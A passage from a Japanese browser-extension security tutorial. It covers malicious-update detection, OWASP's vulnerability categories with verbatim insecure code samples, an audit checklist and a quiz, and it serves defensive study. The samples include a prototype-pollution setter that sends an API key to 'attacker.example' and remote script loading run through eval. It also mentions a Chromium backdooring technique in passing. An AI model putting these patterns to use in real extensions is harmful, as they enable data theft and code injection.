per-user の Preferences を直接編集し、有効な HMAC を偽造（forge）することで、プロンプトやフラグなしにブラウザが任意の unpacked 拡張を受け入れ・有効化するよう仕向ける、Chromium をバックドア化するステルス技術がある。詳細は HackTricks の `forced-extension-load-preferences-mac-forgery-windows.md`。この手法は**許可された診断・自分の検証環境**でのみ試すこと。

### 9.4 悪性拡張更新の検出（静的バージョン差分）

サプライチェーン侵害は、良性だった拡張への**悪性更新**として来ることが多い。低ノイズな手法は、静的解析（例 Assemblyline）で**新バージョンを最後の既知良好版と比較**し、任意の変更ではなく**高シグナルのデルタ**にアラートを出すことである。

ワークフロー: 旧+新を同じ解析プロファイルに提出し、新規/更新された background/service worker、新規/更新された Content Script、追加された permissions/host_permissions、コードから抽出された新ドメイン（C2/exfil 候補）、新しい静的検知（base64 デコード、cookie ハーベスティング等）、エントロピー急上昇などの統計的異常にフラグを立てる。

スクリプト変更の正確な検出: 新規スクリプト追加は `manifest.json` の差分で、既存スクリプトの変更（manifest 不変）は展開ツリーの**ファイル毎のハッシュ**比較（Assemblyline の `Extract` 出力）で捕捉する。既知 IOC に頼る「イージーモード」を避け、脅威インテリ供給を無効化して内在シグナルに依拠すると、**公開報告前**に悪性更新を捕捉しやすい。高信頼アラートの例は「新ドメイン + 新静的検知 + 更新された background/service worker + 更新/追加された Content Script」の組合せ。主要な Assemblyline サービスは **Extract**（展開+ハッシュ）、**Characterize**（エントロピー等）、**JsJAWS / FrankenStrings / URLCreator**（JS ヒューリスティック・文字列・ドメインの差分）。

---

## 10. OWASP による防御13カテゴリ

OWASP Browser Extension Vulnerabilities Cheat Sheet は、開発者視点の防御を13カテゴリで示す。各カテゴリは「脆弱性 → 例 → 緩和策」の構成。診断者はこの裏返しを「探すべき欠陥リスト」として使える。

### 10.1 Permissions Overreach（権限過剰）

必要以上の権限を要求すると、全タブ・履歴・機微データへのアクセスが付与され、侵害時のリスクが増す。緩和は**最小権限の原則（Principle of Least Privilege, PoLP）**、`optional permissions` の活用、不要権限の定期監査。悪い例（逐語）:

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### 10.2 Data Leakage（データ漏洩）

閲覧アクティビティや個人情報を無防備に外部へ送ると、意図せずユーザーデータを露出する。緩和は全通信 HTTPS、収集の最小化とプライバシーポリシーでの透明化、同意メカニズム。悪い例（逐語）:

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### 10.3 Cross-Site Scripting（XSS）

ユーザー入力をサニタイズせずに描画すると、悪意あるスクリプトが注入される。緩和は CSP、DOMPurify のようなライブラリでのサニタイズ、`innerHTML` を避け `textContent` を使う。悪い例（逐語）:

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### 10.4 Insecure Communication（非セキュア通信）

HTTP で機微データを送ると傍受される。緩和は外部通信を常に HTTPS にし、応答を検証する。悪い例（逐語）: `fetch('http://example.com/api/data');`

### 10.5 Code Injection（コードインジェクション）

信頼できないソースから動的にスクリプトをロードすると、悪意あるコードを実行される。緩和は CSP でスクリプトソースを制限、`eval()` と `innerHTML` を避ける、ページ注入ではなくメッセージング API を使う。悪い例（逐語）:

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### 10.6 Malicious Updates（悪性更新）

信頼できないサーバーから更新を取得すると、全ユーザーに悪性更新がプッシュされうる。緩和は更新のデジタル署名、拡張マーケットプレイス経由の更新への依拠、完全性チェック。MDN の "Don't inject or incorporate remote scripts" を参照。悪い例（逐語）:

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### 10.7 Third-Party Dependencies（サードパーティ依存）

古い/脆弱な第三者ライブラリはリスクになる。緩和は依存の定期監査、`npm audit` や OWASP Dependency-Check、活発にメンテされるライブラリの採用。

### 10.8 Lack of CSP（CSP 欠如）

厳格な CSP がないと拡張ページへのスクリプト注入リスクが増す。緩和は `manifest.json` に厳格な CSP を定義し、nonce/hash ベースで信頼スクリプトのみ許可、インラインスクリプトをブロック。

### 10.9 Insecure Storage（非セキュアストレージ）

認証トークンを `localStorage` に平文で置くと容易にアクセスされる。緩和は Chrome Storage API の利用、保存前の暗号化、コードへのハードコード禁止。悪い例（逐語）: `localStorage.setItem('token', 'my-secret-token'); // No encryption`

### 10.10 Insufficient Privacy Controls（プライバシー統制不足）

データ取扱いを明示しないと侵害や不正利用を招く。緩和は明確なプライバシーポリシー、オプトアウト、GDPR/CCPA 準拠。

### 10.11 DOM-based Data Skimming（DOM ベースのデータスキミング）

拡張が機微情報を Web ページの DOM に直接レンダリングすると、ページ自身のスクリプトから読めてしまう。手法（プレーン DOM 操作でも React コンポーネント注入でも）に関わらず適用される。悪意ある/侵害されたページは DOM を検査し、個人識別情報・財務詳細・AI チャット履歴などを読み取り exfiltrate しうる。悪い例（逐語）:

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

緩和は、機微情報を DOM に直接描かず、ページから隔離された拡張制御の UI に表示すること。安全な代替は **Popup**、**Options Page**、**Side Panel**（Chromium 用語。Firefox では "Sidebar"）。重要な注意として、**Shadow DOM は十分な safeguard にならない可能性がある**。ページスクリプトは 'open' Shadow DOM を query でき、他拡張を脅威とみなすモデルなら 'closed' Shadow DOM も `openOrClosedShadowRoot()` API で貫通されうる。真に分離された拡張制御 UI が最も信頼できる。

### 10.12 Prototype-based Data Skimming（プロトタイプベースのデータスキミング）

これは isolated world / main world の理解の核心である。Content Script は **"isolated world"**（ページから分離された JS コンテキスト）で実行される。一方、拡張が **"main world"**（ページのコンテキスト）でスクリプトを実行する方法もあり、例えば web accessible resources のスクリプトを指す `<script>` タグを DOM に注入できる。

拡張が main world で機微情報を扱うと、そのデータはページのスクリプトからアクセス可能になる。理由は、コンテキストのグローバルオブジェクト（"built-in objects", "primordials", "prototypes"）が上書きされうるためである。これを **prototype pollution（プロトタイプ汚染）** / prototype overriding と呼ぶ。悪意あるページは自身のグローバルを上書きし、それらが扱う任意のデータを盗める。ここでのオブジェクトは関数を含むほぼ全てを含む。悪い例（逐語）:

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

緩和は、機微情報を扱うときは**一瞬でもページのコンテキストを使わない**こと。通信が必要なら非機微で必須の情報だけを渡す（秘密トークン全体でなく検証結果だけ）。`window.postMessage` も上書きされうるし、悪意あるスクリプトが `message` リスナーを追加しうるため同様。ネイティブプロトタイプを取得するトリックは、そのバイパスがしばしば発明されるため推奨されない。また `document_start` で実行されてもネイティブプロトタイプを使えると仮定しないこと。少なくとも Chromium では、新規 iframe のコンテキストが `document_start` 時点でも拡張スクリプト開始**前**にページスクリプトに細工されうる（公式バグ issue `https://issues.chromium.org/issues/40202434`）。

### isolated world vs main world 早見表

| 観点 | isolated world | main world |
|------|----------------|------------|
| 実行主体 | Content Script | ページ自身のスクリプト / 拡張が DOM 注入した `<script>`（web_accessible_resources 経由） |
| JS ヒープ | ページと**別** | ページと**共有** |
| DOM アクセス | 可（共有 DOM） | 可 |
| ページ JS 変数/関数への直接アクセス | 不可（JS ポインタ交換なし） | 可 |
| prototype pollution の影響 | 受けにくい（分離） | **直接受ける** |
| chrome.* API | 一部（storage 等） | 原則不可 |

### 10.13 Insecure Message Passing（非セキュアなメッセージパッシング）

拡張は低特権コンテキスト（Content Scripts, Popup）と高特権の Service Worker（Background）間のメッセージパッシングに依拠する。Service Worker が送信者の origin/URL を検証しないと、侵害されたページが悪意あるメッセージを送り、特権アクション（機微データや API キーの取得）を実行させうる。悪い例（逐語）:

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

緩和は、全受信メッセージを信頼できない入力として扱い、Service Worker で常に `sender.id` を検証（自拡張発と保証）、`sender.url` / `sender.origin` を検証、Web ページが CS を介して特権ロジックに間接影響することを許さない、`request.action` と全パラメータの厳格な検証・allow-listing を行う。Chrome は「Content Script は拡張ページより信頼性が低く、そう扱うべき」と明示している。セキュアな例（逐語）:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

> ### 📌 ここは自分で開いて読んでください
> **資料**: OWASP Browser Extension Vulnerabilities Cheat Sheet（レンダリング版）— https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html
> **なぜ**: 本環境からレンダリング版ホストが自動取得できなかった（理由: サイト側の egress 制限で 403）。本文は GitHub 原典 Markdown を全文取得して作成しているが、リンク先の姉妹チートシートや最新の追記は本文に含まれない。
> **読みどころ**:
> 1. 各カテゴリの Mitigation の**原文英語の推奨文言**（開発者へそのまま引用したい場合）。
> 2. 姉妹の Content Security Policy Cheat Sheet（nonce/hash ベースポリシーの具体的書き方）。
> 3. DOM-based / Prototype-based Data Skimming（#11・#12）の最新記述、および参照リンク Chrome Extension Security Guide と Firefox Security best practices（remote scripts 禁止の一次情報）。
> **代替手段**: 原文再取得は raw URL が確実 — `https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.md`

---

## 11. セキュリティ監査チェックリスト

HackTricks の逐語チェックリスト（診断・防御の両面で使える）:

- [ ] `permissions` を可能な限り制限する
- [ ] `host_permissions` を可能な限り制限する
- [ ] 強い `content_security_policy` を使う
- [ ] `externally_connectable` を可能な限り制限する。不要かつ可能ならデフォルトのまま放置せず `{}` を指定する
  - [ ] ここに XSS/テイクオーバーに脆弱な URL が記載されると、攻撃者はバックグラウンドスクリプトへ直接メッセージを送信できる（非常に強力なバイパス）
  - [ ] 特権的な外部ハンドラに対し `*.example.com` のようなワイルドカードや suffix 信頼を拒否する
  - [ ] 許可オリジンがベンダーホストのウィジェット・ユーザーコンテンツ・バージョン付きレガシーアセットを配信していないかレビューする
- [ ] `web_accessible_resources` を可能な限り制限する（可能なら空でも）
- [ ] `web_accessible_resources` が空でない場合、ClickJacking をチェックする
- [ ] 拡張から Web ページへの通信がある場合、その通信で生じる XSS をチェックする
  - [ ] Post Messages が使われる場合、Post Message 脆弱性をチェックする
  - [ ] Content Script が DOM 詳細にアクセスする場合、Web に改変されて XSS を導入していないか確認する
  - [ ] この通信が Content Script → Background 通信にも関与する場合は特に強調する
  - [ ] バックグラウンドがネイティブメッセージングで通信する場合、通信がセキュアかつサニタイズされているか確認する
- [ ] 機密情報を拡張の**コード**に保存しない
- [ ] 機密情報を拡張の**メモリ**に保存しない
- [ ] 機密情報を**ファイルシステム上に無保護で**保存しない

---

## 手を動かす

以下は自分でインストールした拡張、または許可された診断対象に対してのみ行うこと。

1. 対象拡張のソースを取る。まずローカルなら `chrome://version/` で Profile Path を確認し、その `Extensions/<id>/<version>/` を開く。公開ストアの拡張なら 8.1 の `curl` コマンドで CRX を ZIP として落として `unzip` する。
2. `manifest.json` を開き、`manifest_version`、`permissions`、`host_permissions`、`content_scripts.matches`、`content_security_policy`、`web_accessible_resources`、`externally_connectable` を書き出す。4節の表と照合してリスクの高いフィールドに印を付ける。
3. `externally_connectable` に `matches` があれば、そのオリジン一覧を列挙する。ワイルドカード（`*.example.com`）や第三者ウィジェットのオリジンがあれば、5節の監査手順に進む。
4. コード全体を `grep` で走査する。`onMessage`, `onMessageExternal`, `onConnectExternal`, `sendNativeMessage`, `connectNative`, `innerHTML`, `eval`, `postMessage`, `chrome.scripting`, `executeScript` を探し、それぞれ sender/origin 検証があるかを確認する。
5. 実際にインストールして観察する。`chrome://extensions/` で Developer Mode を有効化し `Load unpacked` で読み込む。Ctrl+Shift+I → Source → Content Scripts で Content Script にブレークポイントを置く。背景ロジックは詳細画面から service worker を inspect する。
6. Tarnish（webstore リンクから）や Neto（`neto` を Python 3 で）に同じ拡張を通し、Dangerous Functions / Entry Points / CSP バイパス / Retire.js の結果を、手作業の発見と突き合わせる。
7. 大規模に候補を探すなら `palant/chrome-extension-manifests-dataset` を clone し、9.1 の `node query.js ...` で `nativeMessaging` + `content_scripts` を持つ人気拡張を絞り込む。

## つまずきポイント

- **Content Script は権限が低いから安全、ではない**。Content Script はページからの悪意ある入力の入口であり、`sendMessage` で背景の特権アクションへ橋渡しする。「入口」として最重要である。
- **`document_start` なら prototype 汚染を避けられる、は誤り**。新規 iframe のコンテキストは `document_start` 時点でも拡張スクリプト開始前にページに細工されうる（Chromium バグ issue 40202434）。
- **Shadow DOM で機微データを隠せる、は誤り**。'open' はページから query でき、'closed' も他拡張が `openOrClosedShadowRoot()` で貫通しうる。分離 UI（Popup/Options/Side Panel）を使う。
- **`externally_connectable` を宣言しない = 安全、ではない**。宣言なし（または `"ids":["*"]`）は「すべての拡張が接続可」を意味する。Web を完全に拒否するには `{}` を明示する。
- **オリジン検証で `endsWith` や正規表現は危険**。`sender.origin.endsWith(".example.com")` はサブドメインテイクオーバーで破られる。exact origin equality（`!==` での厳密比較）を使う。
- **`allowed_origins` にワイルドカードは使えない**（native messaging host の json）。ここは列挙のみ。
- **拡張のメモリ・コードは公開・露出しうる**。秘密鍵やニーモニックを置かない。メモリスナップショットで露見する。
- **MV3 の Service Worker は非永続**。グローバル変数に状態を貯める前提のコードは壊れ、かつ「起動のたびに sender 検証が走るか」を必ず確認する。

## この節のまとめ

- ブラウザ拡張は JavaScript 製で、他サイトの DOM に触れられるため、他サイトの CIA を侵害しうる。
- 拡張は Content Script（ページに触れるが低権限）・Extension Core（高権限だが外界と限定接続）・Native Binary（ホスト全権限）の3層で、各層は別プロセス・サンドボックス・別 JS ヒープで隔離される。
- 攻撃者の目標は、悪意ある入力を CS → Core → Native と順に伝播させ、最終的に RCE に至らせること。
- 診断は必ず `manifest.json` から始め、`permissions` / `host_permissions` / `content_security_policy` / `web_accessible_resources` / `externally_connectable` を攻撃面として読む。
- `externally_connectable` にワイルドカードや第三者オリジンを許可すると、そのオリジンの XSS/テイクオーバーが CS と CSP をバイパスして背景スクリプトへ直接到達する（最も強力なバイパス）。
- 外部メッセージハンドラは exact origin equality で検証し、メッセージタイプとオリジンを一緒に認可する。suffix/regex/ワイルドカード信頼は破られる。
- Web ↔ CS の Post Message は `event.isTrusted` / origin / `source !== window` で検証するが、それでも脆弱になりうる。
- Native Messaging はセキュアでないと RCE を招く。CS のワイルドカード → `sendMessage` → `sendNativeMessage` → ネイティブ側の危険処理、が任意ページ→RCE の連鎖になる。
- isolated world の CS は prototype 汚染を受けにくいが、main world で機微データを扱うと prototype pollution で盗まれる。機微データは一瞬でもページコンテキストに置かない。
- 機微情報を DOM に直接描くと DOM ベースデータスキミングで読まれる。Popup/Options/Side Panel の分離 UI を使う。Shadow DOM は safeguard にならない。
- Service Worker（Background）は `sender.id` と `sender.url`/`origin` を検証しないと、侵害ページから特権アクションを実行させられる。
- ソースは CRX を ZIP として DL、CRX Viewer、ローカルプロファイルの `Extensions/`、拡張子変更などで取得できる。
- 解析ツールは Tarnish（manifest/危険関数/CSP バイパス/Retire.js）、Neto（Python3 展開）、crxaminer（権限リスク評価）、大規模探索に chrome-extension-manifests-dataset。
- 悪性更新は Assemblyline の静的バージョン差分（ファイル毎ハッシュ、新ドメイン、新権限、エントロピー異常）で公開前に捕捉しうる。
- OWASP の13カテゴリは、開発者の防御であると同時に、診断者の「探すべき欠陥リスト」として裏返して使える。

## 理解度チェック

1. Content Script はなぜ「悪意ある入力にさらされる」のに「権限がほとんど無い」のか。
   ▶ 答え: Content Script は任意の（信頼できない）Web ページの DOM に直接触れるため入力にさらされる。一方、直接使える API は `storage` などごく一部で、それ以外の機能は拡張コアへ `sendMessage` で代行させる設計だから権限が低い。

2. 拡張の3層はどんな境界で隔離されているか、3つ挙げよ。
   ▶ 答え: 別々の OS プロセス、（CS と拡張コアは）サンドボックスプロセス、Content Script は別々の JavaScript ヒープ。加えて CS とページは同じ DOM を共有するが JS ポインタを交換しない。

3. `externally_connectable` を宣言しない場合、誰が接続できるか。Web を完全に拒否するにはどう書くか。
   ▶ 答え: 宣言なし（または `"ids":["*"]`）だと**すべての拡張**が接続でき、Web ページは接続できない。Web も拡張も一切拒否するには `"externally_connectable": {}` と明示する。

4. `sender.origin.endsWith(".example.com")` によるオリジン検証はなぜ危険か。正しくはどう書くか。
   ▶ 答え: `evil-example.com` のような別ドメインや、サブドメインテイクオーバー/そのサブドメインの XSS を信頼してしまう。exact origin equality、例えば `if (sender.origin !== "https://app.example.com") return` のように厳密比較する。

5. 「任意ページ → RCE」に至るネイティブメッセージングの連鎖を4段階で述べよ。
   ▶ 答え: (1) 拡張の Content Script にワイルドカードパターン、(2) CS が `postMessage` を `sendMessage` で背景へ、(3) 背景が `sendNativeMessage` でネイティブアプリへ、(4) ネイティブアプリがメッセージを危険に処理してコード実行。

6. isolated world と main world で、prototype pollution の影響の受け方はどう違うか。
   ▶ 答え: isolated world（Content Script）はページと別の JS ヒープなので受けにくい。main world（ページコンテキストで動く注入スクリプト）はページとグローバルを共有するため、ページに上書きされた prototype/setter を直接踏み、データを盗まれる。

7. 機微データを Web ページの DOM に直接描画してはいけないのはなぜか。安全な代替を3つ挙げよ。
   ▶ 答え: ページ自身のスクリプト（悪意ある/侵害された場合）が DOM を読んで exfiltrate できるため（DOM ベースデータスキミング）。代替は Popup、Options Page、Side Panel（Firefox では Sidebar）。Shadow DOM は safeguard にならない。

8. Service Worker（Background）が受信メッセージに対して最低限行うべき検証を2つ挙げよ。
   ▶ 答え: `sender.id !== chrome.runtime.id` で自拡張発かを確認する、`sender.url`（`chrome-extension://` で始まるか）や `sender.origin` を検証する。加えて `request.action` とパラメータの allow-listing。

9. 公開されている Chrome 拡張のソースをコマンドラインで取得する手段を述べよ。
   ▶ 答え: `curl` で `clients2.google.com/service/update2/crx?...id%3D$extension_id%26uc` から CRX を ZIP として落とし、`unzip` で展開する（8.1 の逐語コマンド）。

10. 悪性拡張更新を「公開報告前」に捕捉するための考え方は何か。
    ▶ 答え: 既知 IOC に頼る検出を避け、脅威インテリ供給を無効化して内在シグナル（新ドメイン、ヒューリスティック、スクリプトのファイル毎ハッシュ差分、エントロピー異常）に依拠し、新旧バージョンの高シグナルなデルタにアラートを出す（例 Assemblyline）。

## 出典

- HackTricks — Browser Extension Pentesting Methodology: https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html （原典 raw: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/README.md ）
- OWASP — Browser Extension Vulnerabilities Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html （原典 raw: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.md ）
- ShadowPrompt (koi.ai): https://www.koi.ai/blog/shadowprompt-how-any-website-could-have-hijacked-anthropic-claude-chrome-extension
- Universal Code Execution in Browser Extensions (spaceraccoon): https://spaceraccoon.dev/universal-code-execution-browser-extensions/
- An Evaluation of the Google Chrome Extension Security Architecture: http://webblaze.cs.berkeley.edu/papers/Extensions.pdf

<!-- sources: https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html, https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html, https://spaceraccoon.dev/universal-code-execution-browser-extensions/, https://www.koi.ai/blog/shadowprompt-how-any-website-could-have-hijacked-anthropic-claude-chrome-extension, https://github.com/palant/chrome-extension-manifests-dataset -->
<!-- terms: ブラウザ拡張, Content Script, Extension Core, Native Binary, manifest.json, externally_connectable, web_accessible_resources, host_permissions, Content Security Policy, Native Messaging, isolated world, main world, prototype pollution, DOMベースデータスキミング, Service Worker, activeTab, run_at, Tarnish, Neto, exact origin equality -->
<!-- self-read: https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html | サイト側egress制限で403、図と委譲子ページは未取得 -->
<!-- self-read: https://www.koi.ai/blog/shadowprompt-how-any-website-could-have-hijacked-anthropic-claude-chrome-extension | 参照リンクで本文未取得 -->
<!-- self-read: https://spaceraccoon.dev/universal-code-execution-browser-extensions/ | 参照リンクで本文未取得 -->
<!-- self-read: https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html | サイト側egress制限で403、姉妹チートシート未取得 -->
